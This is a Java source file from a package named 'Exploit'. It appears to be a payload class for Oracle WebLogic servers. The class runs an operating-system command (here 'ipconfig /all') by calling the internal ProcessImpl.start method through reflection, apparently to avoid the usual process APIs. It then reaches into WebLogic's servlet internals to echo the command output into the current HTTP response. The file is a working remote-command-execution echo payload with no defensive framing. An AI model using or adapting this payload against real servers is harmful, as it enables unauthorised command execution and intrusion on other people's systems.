package top.racerz.Exploit;

import org.apache.catalina.connector.Response;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.catalina.core.ApplicationFilterChain;

import javax.servlet.ServletResponse;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.Map;

public class Command {
    private String result;

    public Command() throws Exception {

        String[] cmd = {"ipconfig", "/all"};

        Class<?> clazz = Class.forName("java.lang.ProcessImpl");
        Method method = clazz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
        method.setAccessible(true);
        Object obj = method.invoke(null, cmd, null, ".", null, true);

        Method inMethod = obj.getClass().getDeclaredMethod("getInputStream");
        inMethod.setAccessible(true);
        InputStream in = (InputStream) inMethod.invoke(obj);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] b = new byte[1024];

        int a;
        while ((a = in.read(b)) != -1) {
            baos.write(b, 0, a);
        }
        this.result = baos.toString();

        this.echo();
    }

    public void echo() throws Exception {
        Class<?> clazz = Class.forName("weblogic.work.ExecuteThread");
        Method m = clazz.getDeclaredMethod("getCurrentWork");
        Object currentWork = m.invoke(Thread.currentThread());

        Class<?> servletRequestImpl = Class.forName("weblogic.servlet.internal.ServletRequestImpl");
        Method m2 = servletRequestImpl.getDeclaredMethod("getResponse");
        Object response = m2.invoke(currentWork);

        Class<?> servletResponseImpl = Class.forName("weblogic.servlet.internal.ServletResponseImpl");
        Method m3 = servletResponseImpl.getDeclaredMethod("getServletOutputStream");
        Object outputStream = m3.invoke(response);

        Class<?> stringInputStream = Class.forName("weblogic.xml.util.StringInputStream");
        Constructor<?> constructor = stringInputStream.getDeclaredConstructor(String.class);
        Object resultStream = constructor.newInstance(this.result);

        Class<?> servletOutputStreamImpl = Class.forName("weblogic.servlet.internal.ServletOutputStreamImpl");
        Method m4 = servletOutputStreamImpl.getDeclaredMethod("writeStream", stringInputStream);
        m4.invoke(outputStream, resultStream);

        Method m5 = servletOutputStreamImpl.getDeclaredMethod("flush");
        m5.invoke(outputStream);

        Method m6 = servletResponseImpl.getDeclaredMethod("getWriter");
        Object writer = m6.invoke(response);

        Class<?> printWriter = Class.forName("java.io.PrintWriter");
        Method m7 = printWriter.getDeclaredMethod("write", String.class);
        m7.invoke(writer, "");

    }

    public static void main(String[] args) throws Exception {
        new Command();
    }
}
